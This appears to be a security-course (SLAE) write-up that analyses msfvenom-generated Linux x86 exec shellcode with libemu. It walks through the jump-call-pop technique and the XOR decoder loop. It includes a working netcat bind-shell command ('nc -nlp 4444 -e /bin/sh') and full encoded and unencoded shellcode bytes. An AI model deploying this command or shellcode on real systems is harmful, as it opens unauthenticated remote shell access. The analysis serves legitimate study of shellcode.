## Overview
For the 5th assignment of the SLAE Exam, I will be analyzing 3 different linux x86 shellcodes created with MSF Venom.  
The first will be the payload `/linux/x86/exec`.   
+ The command being executed will be `nc -nlp 4444 -e "/bin/sh" &`  
+ This will create a bind shell, on TCP port 4444, on all network interfaces, and then background the process.  

## Testing the Command
```console
root# nc -nlp 4444 -e "/bin/sh" &
[1] 9119
root# netstat -tnalp | grep nc
tcp   0.0.0.0:4444    0.0.0.0:*  LISTEN  9119/nc
```
+ The command successfully ran and was given the process ID 9119 and the job ID of 1.  
+ The process `nc` is successfully listening on all interfaces `0.0.0.0`, on TCP port `4444`.  

Since the job is running in the background, we can use the same terminal window to access our /bin/sh listening on all interfaces, by using netcat to connect to the localhost interface (127.0.0.1) on TCP port 4444.  

### Connecting to Netcat Shell
```console
root# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```
+ We successfully are able to run commands with our netcat, bind shell.  

## Creating the Shellcode with msfvenom
Now we will use msfvenom to create a shellcode to execute our netcat, bind shell command. The output will be in C so we can easily add it to our shellcode.c program.  

```console
root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' --format c
Payload size: 63 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x1c\x00\x00\x00\x6e"
"\x63\x20\x2d\x6e\x6c\x70\x20\x34\x34\x34\x34\x20\x2d\x65\x20"
"\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x20\x26\x00\x57\x53\x89"
"\xe1\xcd\x80";
```
+ This payload contains NULL bytes, rendering it useless for shellcode. We will use the builtin XOR encoder to encode our payload before we analyze it.  

### Encoding the Payload
```console
root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &'\
 --format c --encoder x86/xor_dynamic     
x86/xor_dynamic chosen with final size 109
Payload size: 109 bytes
unsigned char buf[] =
"\xeb\x23\x5b\x89\xdf\xb0\x1a\xfc\xae\x75\xfd\x89\xf9\x89\xde"                                                         
"\x8a\x06\x30\x07\x47\x66\x81\x3f\x88\x02\x74\x08\x46\x80\x3e"                                                         
"\x1a\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x02\x1a\x68"                                                         
"\x09\x5a\x9b\x50\x64\x6a\x2f\x61\x8b\xe5\x6a\x2d\x71\x6a\x02"                                                         
"\x6a\x2d\x60\x6b\x6c\x8b\xe1\x50\xea\x1e\x02\x02\x02\x6c\x61"                                                         
"\x22\x2f\x6c\x6e\x72\x22\x36\x36\x36\x36\x22\x2f\x67\x22\x20"                                                         
"\x2d\x60\x6b\x6c\x2d\x71\x6a\x20\x22\x24\x02\x55\x51\x8b\xe3"                                                         
"\xcf\x82\x88\x02";
```

Perfect, now our shellcode is NULL free. Next we will use sctest from libemu to analyze the shellcode.

### Installing LibEmu  
I used my  64-bit Kali machine to create the 32-bit MSF Venom shellcode, and to analyze it with libemu. Unfortunately I could not find a trust-worthy download from the internet. Fortunately libemu is included in the kali repo.
```console
root# apt search libemu
libemu2/kali-rolling,now 0.2.0+git20120122-1.2+b1 amd64 [installed,automatic]
  x86 shellcode detection and emulation
```

### LibEmu Shellcode Analyzation
Now that we have libemu, we will pipe our payload from msfvenom into sctest. Using sctest from libemu, we will create a visual map of how the shellcode is being executed.  

```console
root# msfvenom --payload linux/x86/exec CMD='nc -nlp 4444 -e "/bin/sh" &' \
--encoder x86/xor_dynamic | sctest -Ss 10000 -vvv -G execNC.dot
# Convert from dot to png
root# dot -Tpng execNC.dot -o execNC.png
# open png picture with eog
eog execNC.png
```

## Breaking Down the Flow Chart
At first this may look a little over-whelming, but once we start breaking it down, we will see it is not that bad.  

In the top most block, we can see that the shellcode is using the _Jump-Call-Pop_ technique.  

The first instruction `jmp 0x25`, jumps our Instruction Pointer `EIP` forward 25 bytes. 
+ This is a short jump. 
  - Short jumps use offsets instead of a hard-coded address. 
  - This allows the shellcode to work in the programs it is injected into.

The next instruction `call 0xffffffdd`, is a call instruction. 
+ This is similar to a jump instruction. 
  - Although before jumping, the instruction after the call instruction is pushed onto the stack. 
+ This allows the program to return to where it was, once it is done execution where it was called to. 
+ In our situation, the next instruction is actually the memory location to our string. 
  - Our string is our entire, XOR'd shellcode payload. 

The 3rd instruction `pop ebx`, _pop's_ the pointer to our payload off into the `EBX` Register.   

Once in the EBX Register, it is duplicated to the EDI Register using the instruction `mov, edi,ebx`.  

We can see that the loop, outlined using the blue arrow, is a XOR decoder loop.  
+ The decoder decodes our shellcode byte by byte using the instruction `xor [edi], al`.   

After the byte is decoded, the EDI Register is moved forward one byte using the instruction `inc edi`.   

The instruction `cmp word [edi],0x971b` compares 2 bytes (a word) starting at the memory location of EDI, with the value 0x971b.   
+ If the compare instruction returns that the 2 words match, then the result will return a 0.  
+ The `cmp` instruction subtracts the two values and sets the Zero Flag if Zero.  

The instruction `jz 0xa` will jump `EIP` forward 10 bytes, if the last instruction returned zero.   
+ This insturction is "Jump if Zero", also know as "Jump if Equal".   

If we do the math we can see that that would change our location from 0x00417019, to 0x00417023 (indicated by the black arrow).   
Remember that this is in Hex not in Decimal, do not be decieved thinking it is only moving forward four.   
```
Decimal Incrementing:  0  > 1  > 2  > 3  > 4  > 5  > 6  > 7  > 8  > 9  > 10
Hex Incrementing:      19 > 1a > 1b > 1c > 1d > 1e > 1f > 20 > 21 > 22 > 23
```
